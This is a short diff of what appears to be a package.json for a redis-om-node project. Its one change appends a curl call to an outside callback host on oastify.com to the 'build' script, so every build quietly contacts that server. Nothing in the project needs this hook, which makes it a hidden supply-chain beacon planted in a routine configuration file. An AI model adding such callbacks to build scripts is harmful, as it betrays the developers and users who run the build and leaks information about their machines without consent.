@@ -13,7 +13,7 @@
     "docs/**/*"
   ],
   "scripts": {
-    "build": "tsup",
+    "build": "tsup && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/redis-om-node",
     "docs": "rm -rf ./docs && typedoc",
     "test": "vitest",
     "test:coverage": "vitest run --coverage",
